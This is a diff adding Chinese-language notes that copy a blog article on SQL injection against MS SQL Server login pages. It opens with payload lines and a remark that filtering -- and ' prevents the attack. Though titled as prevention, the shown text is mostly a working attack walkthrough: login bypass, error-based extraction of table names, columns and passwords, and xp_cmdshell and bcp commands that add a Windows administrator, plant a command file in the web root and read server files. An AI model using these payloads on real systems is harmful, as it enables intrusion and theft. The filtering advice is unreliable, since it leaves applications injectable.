@@ -1,0 +1,106 @@
+ 
+amdin'/*
+amdin'--
+' or 1=1-- 
+所以不要讓使用者輸入--和',但'好像一定會被輸入,所以不要讓他們輸入--
+
+
+怎麼樣防止SQL注入來攻擊你的系統 
+http://www.cnblogs.com/helimin19/articles/77459.html
+令天我主要講講，很多程序員在寫登錄程序時經常是以 
+sqlString = "Select * from users where userName='" & userName & "'" 
+or 
+sqlString = "Select * from users where userName='" & userName & "' and passWord='" & passWord & "'" 
+的形式登錄系統的 
+那麼如在沒有控制輸入數據時將會出現一些bug，也正是這一點，常常導致系統被人攻擊 
+ 
+例：當用戶沒有控制userName的輸入時，當用戶輸入：' drop table users --時，上面的語句就會變成 
+Select * from users where userName='' drop table users -- 
+Select * from users where userName='' drop table users -- and passWord='xxxx' 
+這樣的形式， 
+在執行時，就會將用戶表users給刪除了, 
+針對這類形式，黑客可以非常簡單的進進攻擊，從而進入你的系統 
+ 
+針對第二種sql語句，使用者甚至只要提供所知道的用戶名就可以登錄系統：如輸入：amdin'-- 
+則為 
+Select * from users where userName='admin'-- and passWord='xxx' 
+ 
+針對第二種sql語句：使用者輸入：' or 1=1-- 
+則為 
+Select * from users where userName='' or 1=1-- and passWord='xxx' 
+那麼就可以使用表中的第一個用戶登錄了 
+ 
+針對第二種sql語句：使用者還可以使用虛構用戶來進行登錄 
+如輸入：' union select 1,'username','password',1-- 
+則為 
+Select * from users where userName='' union select 1,'username','password',1-- 
+針對這種情況還需要以下的操作才能進行 
+ 
+以下操作需要用戶沒有屏蔽錯誤信息才能進行 
+當使用者輸入：' having 1=1-- 
+就會出現以下錯誤信息： 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14'  
+[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'users.id' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.  
+這樣就可以獲得表名為users;第一個字段名為id 
+再輸入:' group by users.id having 1=1-- 
+出現的錯誤信息： 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14'  
+[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'users.username' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.  
+獲得第二個字段名：users.username 
+這樣一直輸入下去直到沒有顯示錯誤為止 
+這樣使用者就知道了表的名稱與字段名稱了，再來確定各字段的類型 
+繼續輸入：' union select sum(id) from users-- 
+則會出現錯誤： 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.  
+則就知道了users.id的數據類型為varchar型了 
+一直這樣下去，就可得出每個字段的數據類型了 
+ 
+現在我們就可以在你的用戶表中新增加自己想要的用戶了 
+輸入：' insert into users values('xx','xx','xx',xx)-- 
+ 
+使用者還可以通過數據類型轉換時出現的錯誤來進行攻擊： 
+例輸入：' union select min(username) from users where username>'a'-- 
+這句表示從users表中去找username字段大於'a'的最小值，並轉換成整數 
+那麼獲得的第一個字段如“admin”因無法轉換成整數 
+則出現的錯誤為： 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value 'admin' to a column of data type int. 
+那麼就可以得到其想要的字段值:admin 
+就這樣下去，你可以得到想要字段的任何值了：) 
+現在來找找，已知字段值的其它字段的值 
+輸入：' union select min(password) form users where username='admin'-- 
+則輸入錯誤： 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value 'userpass' to a column of data type int. 
+怎麼樣，是不是獲得了對應的值了 
+這樣的操作可以獲得數據庫中中任何表的任何值了 
+ 
+現在可以登錄你的系統了吧：) 
+ 
+ 
+當我們全完控制了你的系統後，那麼嘿嘿，就可以為所欲為了 
+不信的話就看下面的吧：) 
+ 
+一、獲得你機子上面的源代碼 
+Create table Temp1(f1 varchar(8000)) 
+bulk insert Temp1 form '文件路徑' 
+這樣就可以將你的文件內容都讀到Temp1表中去了 
+ 
+二、在你的機子上建立文本文件(這樣就可以上傳要馬程序了) 
+bcp "select * from SqlDll.dbo.temp1" queryout c:\inetpub\wwwroot\runcommand.asp –c -Slocalhost –Usa –P123456 
+ 
+三、在你的機子上建立一個管理員的用戶：aaa,密碼：bbb 
+exec master..xp_cmdshell 'net user aaa bbb /add' 
+exec master..xp_cmdshell 'net localgroup administrators aaa /add' 
+ 
+四、將你的數據庫備份到一個www目錄下去，再通過ie下載過來 
+backup database SqlDll to disk='c:\inetpub\wwwroot\database.db' 
+ 
+五、查看你機子上的所有驅動器與目錄結構，還可以查看你上面的文件 
+1.獲得的你機子上的所有驅動器 
+exec master.dbo.xp_availablemedia 
+2.獲得指定驅動器下面的所有目錄 
+exec master.dbo.xp_dirtree 'c:\' 
+3.查看指定的文件內容 
+exec master.dbo.xp_cmdshell 'type d:\11.txt' 
